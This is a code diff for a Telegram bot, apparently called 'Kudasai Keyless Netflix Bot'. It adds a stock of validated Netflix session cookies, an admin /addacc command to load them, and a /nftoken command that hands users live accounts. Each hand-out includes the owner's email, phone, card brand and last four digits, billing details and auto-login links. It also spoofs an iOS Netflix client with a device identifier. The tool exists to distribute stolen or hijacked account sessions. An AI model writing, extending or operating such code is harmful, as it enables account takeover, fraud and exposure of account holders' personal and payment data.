@@ -58,6 +58,20 @@ def init_db():
             checks_count INTEGER DEFAULT 0
         )
     """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS accounts (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            cookies TEXT,
+            added_by INTEGER
+        )
+    """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS user_claims (
+            user_id INTEGER,
+            account_id INTEGER,
+            PRIMARY KEY (user_id, account_id)
+        )
+    """)
     conn.commit()
     conn.close()
 
@@ -167,7 +181,6 @@ def parse_netscape(text):
         line = line.strip()
         if not line or line.startswith("#"):
             continue
-        # Support both tab-separated and whitespace-separated Netscape formats
         parts = re.split(r'\s+', line)
         if len(parts) >= 7:
             cookies[parts[5]] = parts[6]
@@ -245,9 +258,6 @@ _IOS_HEADERS = {
     "x-netflix.client.type": "argo",
     "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
     "x-netflix.context.locales": "en-US",
-    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
-    "x-netflix.client.iosversion": "15.8.5",
-    "accept-language": "en-US;q=1",
     "x-netflix.argo.abtests": "",
     "x-netflix.context.os-version": "15.8.5",
     "x-netflix.request.client.context": '{"appState":"foreground"}',
@@ -459,6 +469,7 @@ def get_main_menu(user_id):
     is_admin = user_id in ADMIN_IDS
     keyboard = [
         [InlineKeyboardButton("🍪 Check Netflix Cookie", callback_data="check_prompt")],
+        [InlineKeyboardButton("🎟 Get Account (/nftoken)", callback_data="get_nftoken")],
         [InlineKeyboardButton("📊 My Account Status", callback_data="check_status"), InlineKeyboardButton("📖 Guide", callback_data="guide")]
     ]
     if is_admin:
@@ -475,6 +486,8 @@ def get_join_menu():
 async def set_bot_commands(application):
     commands = [
         BotCommand("start", "Open main menu"),
+        BotCommand("nftoken", "Get a verified Netflix account token"),
+        BotCommand("addacc", "Add Netflix account cookies (Admin only)"),
         BotCommand("stats", "Check total bot statistics"),
         BotCommand("admin", "Open admin panel (Admin only)")
     ]
@@ -510,6 +523,140 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif update.callback_query:
         await update.callback_query.message.edit_text(welcome_text, parse_mode="Markdown", reply_markup=get_main_menu(user.id))
 
+# ==================== NEW COMMANDS: /addacc & /nftoken ====================
+
+async def add_acc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    if user.id not in ADMIN_IDS:
+        await update.message.reply_text("❌ This command is for admins only!")
+        return
+
+    text = update.message.text
+    parts = text.split(maxsplit=1)
+    if len(parts) < 2:
+        await update.message.reply_text("⚠️ Correct usage:\n`/addacc <cookies>`", parse_mode="Markdown")
+        return
+
+    cookie_text = parts[1].strip()
+    status_msg = await update.message.reply_text("⏳ <i>Verifying account and adding to database...</i>", parse_mode="HTML")
+
+    cookies = load_cookies(cookie_text)
+    if not cookies or not any(cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
+        await status_msg.edit_text("❌ <b>Error:</b> No valid Netflix cookies found.", parse_mode="HTML")
+        return
+
+    acc = await asyncio.to_thread(check_account, cookies, 20)
+    if not acc:
+        await status_msg.edit_text("❌ <b>Error:</b> Account is dead or invalid, cannot be added.", parse_mode="HTML")
+        return
+
+    db_query("INSERT INTO accounts (cookies, added_by) VALUES (?, ?)", (cookie_text, user.id))
+
+    await status_msg.edit_text(
+        f"✅ <b>Account successfully added to stock!</b>\n\n"
+        f"📧 Email: <code>{acc['email']}</code>\n"
+        f"📋 Plan: <b>{acc['plan']}</b>\n"
+        f"🌍 Country: {acc['country']} ({acc['country_code']})",
+        parse_mode="HTML"
+    )
+
+async def nftoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    db_query("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user.id, user.username or "Unknown"))
+
+    is_ch, is_gp = await check_memberships(context.bot, user.id)
+    if not is_ch or not is_gp:
+        join_text = (
+            "🚨 **Channel & Group Subscription Required!**\n\n"
+            f"Please join both our channel ({REQUIRED_CHANNEL}) and group ({REQUIRED_GROUP}) first."
+        )
+        if update.message:
+            await update.message.reply_text(join_text, parse_mode="Markdown", reply_markup=get_join_menu())
+        elif update.callback_query:
+            await update.callback_query.message.reply_text(join_text, parse_mode="Markdown", reply_markup=get_join_menu())
+        return
+
+    # If triggered via callback, we send a new message or reply to message so it doesn't break
+    if update.callback_query:
+        status_msg = await update.callback_query.message.reply_text("⏳ <i>Pulling an account from stock and verifying...</i>", parse_mode="HTML")
+    else:
+        status_msg = await update.message.reply_text("⏳ <i>Pulling an account from stock and verifying...</i>", parse_mode="HTML")
+
+    while True:
+        # First try to pick an account this user hasn't received yet
+        row = db_query("""
+            SELECT * FROM accounts 
+            WHERE id NOT IN (SELECT account_id FROM user_claims WHERE user_id = ?) 
+            ORDER BY RANDOM() LIMIT 1
+        """, (user.id,), "one")
+
+        # If they have received all accounts, fallback to picking any random account from stock
+        if not row:
+            row = db_query("SELECT * FROM accounts ORDER BY RANDOM() LIMIT 1", fetch="one")
+
+        if not row:
+            await status_msg.edit_text("❌ <b>Sorry, stock is currently empty!</b> Please try again later.", parse_mode="HTML")
+            return
+
+        acc_id = row["id"]
+        cookie_text = row["cookies"]
+        cookies = load_cookies(cookie_text)
+
+        acc = await asyncio.to_thread(check_account, cookies, 20)
+        if not acc:
+            # If the account is dead, remove it completely from database and user claims, then loop again
+            db_query("DELETE FROM accounts WHERE id=?", (acc_id,))
+            db_query("DELETE FROM user_claims WHERE account_id=?", (acc_id,))
+            continue
+
+        # Record that this user received this account so they get a different one next time
+        db_query("INSERT OR IGNORE INTO user_claims (user_id, account_id) VALUES (?, ?)", (user.id, acc_id))
+        break
+
+    db_query("UPDATE users SET checks_count = checks_count + 1 WHERE user_id=?", (user.id,))
+
+    cc = acc.get("country_code", "XX")
+    flag = _flag(cc)
+    p = acc.get("profiles", [])
+    profs = ", ".join(p[:4]) if p else "N/A"
+    pv = "✅" if acc.get("phone_verified") else "❌"
+    nf_id = acc.get("netflix_id_raw", "")
+
+    caption = (
+        f"🎬 <b>NETFLIX ACCOUNT FOUND</b>\n\n"
+        f"👤 <b>{acc['name']}</b>\n"
+        f"📧 <code>{acc['email']}</code>\n"
+        f"🌍 {acc['country']} {flag} ({cc})\n\n"
+        f"📋 <b>{acc['plan']}</b>  •  💰 {acc['price']}\n"
+        f"📅 Since: {acc['member_since']}\n"
+        f"🗓 Billing: {acc['next_billing']}\n"
+        f"🎁 Free Trial: {'Yes' if acc['free_trial'] else 'No'}\n\n"
+        f"🎥 {acc['video_quality']}  |  📺 {acc['max_streams']} streams  |  ➕ {acc['extra_slots']} extra\n"
+        f"💳 {acc['card_brand']} *{acc['card_last4']}  •  {acc['payment_method']}\n"
+        f"📞 {acc['phone']}  {pv}\n"
+        f"👥 Profiles ({acc['profile_count']}): {profs}\n\n"
+        f"🍪 <b>Cookie Snippet</b>\n"
+        f"<code>NetflixId={nf_id[:30]}...</code>\n\n"
+        f"➖➖➖➖➖➖➖➖➖➖\n"
+        f"➡️ <b>Developer:</b> {OWNER_HANDLE}\n"
+        f"🤖 <b>Bot:</b> {BOT_HANDLE}"
+    )
+
+    buttons = []
+    row1 = []
+    if acc.get("login_pc") and acc["login_pc"] != "N/A":
+        row1.append(InlineKeyboardButton("🖥 Click to PC", url=acc["login_pc"]))
+    if acc.get("login_phone") and acc["login_phone"] != "N/A":
+        row1.append(InlineKeyboardButton("📱 Click to Phone", url=acc["login_phone"]))
+    if row1:
+        buttons.append(row1)
+    buttons.append([InlineKeyboardButton("📺 Click to TV", url=acc["login_tv"])])
+
+    reply_markup = InlineKeyboardMarkup(buttons)
+    await status_msg.edit_text(caption, parse_mode="HTML", reply_markup=reply_markup)
+
+# ==================== CALLBACK & MESSAGE HANDLERS ====================
+
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -544,37 +691,41 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Please paste your Netscape cookies, JSON, or cookie text directly in the chat now:",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]]))
+    elif data == "get_nftoken":
+        # Fixed callback routing to safely call nftoken_command
+        await nftoken_command(update, context)
     elif data == "check_status":
         user_data = db_query("SELECT checks_count FROM users WHERE user_id=?", (user_id,), "one")
         total = user_data["checks_count"] if user_data else 0
         total_users = len(db_query("SELECT user_id FROM users", fetch="all"))
+        stock_count = len(db_query("SELECT id FROM accounts", fetch="all"))
 
         await query.message.edit_text(
             f"📊 **Your Account Status:**\n\n"
             f"🆔 Telegram ID: `{user_id}`\n"
             f"📈 Total Checks Performed: `{total}`\n"
             f"👥 Total Bot Users: `{total_users} users`\n"
-            f"⚡ Queue Status: Active (Admin Bypass Enabled)",
+            f"📦 Available Stock Accounts: `{stock_count} accounts`",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
     elif data == "guide":
         guide_msg = (
             "📖 **User Guide:**\n\n"
-            "1. Click **Check Netflix Cookie** and paste your Netscape or JSON cookies.\n"
-            "2. If the server is busy, your request will enter a seamless queue.\n"
-            "3. Get instant account metrics and auto-login links for **PC**, **Phone**, and **TV**!\n\n"
+            "1. Click **Get Account (/nftoken)** to instantly receive a verified active Netflix account.\n"
+            "2. Or click **Check Netflix Cookie** to check your own custom cookies.\n\n"
             f"➡️ Owner: {OWNER_HANDLE}"
         )
         await query.message.edit_text(guide_msg, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
     elif data == "admin_panel":
         if user_id not in ADMIN_IDS: return
         users_count = len(db_query("SELECT user_id FROM users", fetch="all"))
+        stock_count = len(db_query("SELECT id FROM accounts", fetch="all"))
         
         await query.message.edit_text(
             f"⚙️ **ADMIN CONTROL PANEL**\n\n"
             f"👥 Total Registered Users: `{users_count}`\n"
-            f"⚡ Active Semaphore Limit: `3 concurrent checks`\n"
-            f"🛡️ Status: Queue enabled, Admins bypass queue.",
+            f"📦 Accounts in Stock: `{stock_count}`\n"
+            f"🛡️ Commands: Use `/addacc <cookies>` to add accounts.",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")]]))
 
@@ -605,7 +756,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await status_msg.edit_text("❌ <b>Error:</b> Could not detect valid Netflix cookies (`NetflixId` / `SecureNetflixId`).", parse_mode="HTML")
             return
 
-        # Queue handling: Admins skip the semaphore limit completely!
         if is_admin:
             acc = await asyncio.to_thread(check_account, cookies, 20)
         else:
@@ -627,7 +777,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         nf_id = acc.get("netflix_id_raw", "")
 
         caption = (
-            f"🎬 <b>NETFLIX ACCOUNT CHECKED</b>\n\n"
+            f"🎬 <b>NETFLIX ACCOUNT FOUND</b>\n\n"
             f"👤 <b>{acc['name']}</b>\n"
             f"📧 <code>{acc['email']}</code>\n"
             f"🌍 {acc['country']} {flag} ({cc})\n\n"
@@ -667,12 +817,14 @@ def main():
     app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).post_init(set_bot_commands).build()
 
     app.add_handler(CommandHandler("start", start_command))
+    app.add_handler(CommandHandler("nftoken", nftoken_command))
+    app.add_handler(CommandHandler("addacc", add_acc_command))
     app.add_handler(CommandHandler("stats", lambda u, c: c.bot.send_message(u.effective_chat.id, f"📊 Total Bot Users: {len(db_query('SELECT user_id FROM users', fetch='all'))}")))
     app.add_handler(CommandHandler("admin", lambda u, c: u.message.reply_text("Admin Panel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⚙️ Open Admin Control", callback_data="admin_panel")]]))))
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
 
-    print("[+] Kudasai Keyless Netflix Bot is online with Advanced Checker & Queue!")
+    print("[+] Kudasai Keyless Netflix Bot is online with working /nftoken button routing!")
     app.run_polling()
 
 if __name__ == "__main__":
